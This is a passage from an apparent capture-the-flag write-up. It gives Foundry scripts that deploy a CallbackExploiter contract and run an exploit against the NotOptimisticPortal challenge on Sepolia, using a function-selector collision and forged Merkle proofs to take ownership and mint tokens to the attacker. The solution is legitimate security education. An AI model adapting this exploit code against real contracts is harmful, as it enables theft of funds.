            messageReceiversAccumulatedHash,
            messageDatasAccumulatedHash,
            _salt // manipulate just salt
        ));
    }
}
```

#### [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Testnet-script "Testnet-script")Testnet script

First, we need to deploy `CallbackExploiter`. Here is a simple script to do it:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {CallbackExploiter} from "../../src/not-optimistic-portal/CallbackExploiter.sol";

/** Usage:
 *   forge script script/NotOptimisticPortal/DeployAttackerCallback.s.sol:DeployAttackerCallback --rpc-url $RPC_URL --broadcast --private-key $PRIVATE_KEY
 *
 * Or for local testing:
 *   forge script script/NotOptimisticPortal/DeployAttackerCallback.s.sol:DeployAttackerCallback --fork-url $RPC_URL --private-key $PRIVATE_KEY
*/
contract DeployAttackerCallback is Script {
    CallbackExploiter public exploiterCallback;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        exploiterCallback = new CallbackExploiter(vm.envAddress("NOT_OPTIMISTIC_PORTAL_ADDRESS"));

        vm.stopBroadcast();
        require(exploiterCallback.ATTACKER() == vm.addr(deployerPrivateKey), "Deployer does not match ATTACKER");

        console2.log("Deployed CallbackExploiter at: %s", address(exploiterCallback));
    }
}
```

After that, we can retrieve the withdrawal slot and carry out the attack.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {NotOptimisticPortal} from "../../src/not-optimistic-portal/NotOptimisticPortal.sol";
import {CallbackExploiter} from "../../src/not-optimistic-portal/CallbackExploiter.sol";

/** Usage:
 *   forge script script/NotOptimisticPortal/NotOptimisticPortal.s.sol:NotOptimisticPortalAttack --rpc-url $RPC_URL --broadcast --private-key $PRIVATE_KEY
 *
 * Or for local testing:
 *   forge script script/NotOptimisticPortal/NotOptimisticPortal.s.sol:NotOptimisticPortalAttack --fork-url $RPC_URL --private-key $PRIVATE_KEY
*/
contract NotOptimisticPortalAttack is Script {
    NotOptimisticPortal public portal;
    CallbackExploiter public exploiterCallback;
    uint256 AMOUNT_TO_RECEIVE = 1 ether;

    // assumes portal and attacker contract are already deployed
    function run() public {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        portal = NotOptimisticPortal(vm.envAddress("NOT_OPTIMISTIC_PORTAL_ADDRESS"));
        exploiterCallback = CallbackExploiter(vm.envAddress("CALLBACK_CONTRACT_ADDRESS"));

        vm.label(address(portal), "NotOptimisticPortal");
        vm.label(address(exploiterCallback), "CallbackExploiter");
        vm.label(attacker, "Attacker");

        console2.log("=== Executing NotOptimisticPortal Attack ===");

        NotOptimisticPortal.ProofData memory proofs;

        // Fill in the proof data here
        proofs.stateTrieProof = vm.envBytes("STATE_TRIE_PROOF_SEPOLIA"); // Replace with actual proof data
        proofs.storageTrieProof = vm.envBytes("STORAGE_TRIE_PROOF_SEPOLIA"); // Replace with actual proof data
        proofs.accountStateRlp = vm.envBytes("ACCOUNT_STATE_RLP_SEPOLIA"); // Replace with actual proof data

        bytes memory rlpBlockHeader = vm.envBytes("RLP_BLOCK_HEADER_SEPOLIA");
    
        vm.startBroadcast(attackerPrivateKey);
        // Set the block header in the exploiter contract
        exploiterCallback.setRLPBlockHeader(rlpBlockHeader);

        // Set bufferIndex to 1
        exploiterCallback.setBufferIndex(1);

        console2.log("Withdrawal slot: %s", vm.toString(getWithdrawalSlot()));

        // Execute the exploit
        exploiterCallback.exploit(proofs);


        vm.stopBroadcast();
        require(
            portal.balanceOf(attacker) > 0,
            "Attack failed: Attacker did not receive tokens"
        );

        console2.log("=== Attack Completed ===");
        console2.log("Attacker new balance: %s", portal.balanceOf(attacker));
    }


    // forge script script/NotOptimisticPortal/NotOptimisticPortal.s.sol:NotOptimisticPortalAttack --sig "getWithdrawalSlot()(bytes32)" --fork-url $RPC_URL --private-key $PRIVATE_KEY
    function getWithdrawalSlot() public returns (bytes32) {
        // Slot that holds withdrawal mapping
        
        exploiterCallback = CallbackExploiter(vm.envAddress("CALLBACK_CONTRACT_ADDRESS")); 
        portal = NotOptimisticPortal(vm.envAddress("NOT_OPTIMISTIC_PORTAL_ADDRESS"));

        address[] memory receivers = new address[](2);
        bytes[] memory receiversData = new bytes[](2);
        
        console2.log("Portal address: %s", address(portal));
        console2.log("Callback address: %s", address(exploiterCallback));

        receivers[0] = address(portal);
        bytes memory transferOwnershipEncodedCall = abi.encodeCall(
            NotOptimisticPortal.transferOwnership_____610165642,
            (address(exploiterCallback))
        );

        receivers[1] = address(exploiterCallback);
        bytes memory onMessageReceived = abi.encodeCall(
            CallbackExploiter.onMessageReceived,
            (bytes(""))
        );

        
        receiversData[0] = transferOwnershipEncodedCall;
        receiversData[1] = onMessageReceived;

        console2.log("Attacker %s",exploiterCallback.ATTACKER());
        bytes32 slotComputed = _computeMessageSlot(
            exploiterCallback.ATTACKER(),
            AMOUNT_TO_RECEIVE,
            receivers,
            receiversData,
            0 // salt
        );


        console2.log("WITHDRAWAL SLOT: %s", vm.toString(slotComputed));

        return slotComputed;

    }

    function _computeMessageSlot(
        address _tokenReceiver,
        uint256 _amount,
        address[] memory _messageReceivers,
        bytes[] memory _messageDatas,
        uint256 _salt
    ) internal pure returns(bytes32){
        bytes32 messageReceiversAccumulatedHash;
        bytes32 messageDatasAccumulatedHash;

        if(_messageReceivers.length != 0){
            for(uint i; i < _messageReceivers.length - 1; i++){
                messageReceiversAccumulatedHash = keccak256(
                    abi.encode(
                        messageReceiversAccumulatedHash, 
                        _messageReceivers[i])
                    );
                messageDatasAccumulatedHash = keccak256(
                    abi.encode(
                        messageDatasAccumulatedHash, 
                        _messageDatas[i]
                        )
                    );
            }
        }

        // Slot that hold message processing info?
        return keccak256(abi.encode(
            _tokenReceiver,
            _amount,
            messageReceiversAccumulatedHash,
            messageDatasAccumulatedHash,
            _salt // manipulate just salt
        ));
    }
}
```

## [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Conclusions "Conclusions")Conclusions

1.  Most critical and high-severity vulnerabilities come from simple mistakes hidden inside complex codebases. In this case, the "silly" mistake that enabled the entire exploit was not carefully evaluating the function selectors involved.
2.  Pay attention to what matters most. Here, the key insight (in my opinion) was examining the implementation of the onlyOwner modifier.
3.  Understand the underlying data structures. In this challenge, understanding Merkle Patricia tries and how to generate valid proofs was essential for the exploit (and it was the part that took me the longest).

The CTF took me around 3 days to solve: one full day to notice the function selector collision, and two days to generate a valid proof and fully understand Merkle Patricia tries. These are exactly the kinds of CTFs I love. Thanks [Draiakoo](https://x.com/Draiakoo), for the fun :D

## [](https://hackmd.io/@carlitox477/SJt0W0h-Zl#Proof-of-exploit "Proof-of-exploit")Proof of exploit

[Sepolia transaction](https://sepolia.etherscan.io/tx/0xa14fa5b9af500fea8b9430c55fa5f990a469c9ec98451e353f90f44c61a32596)
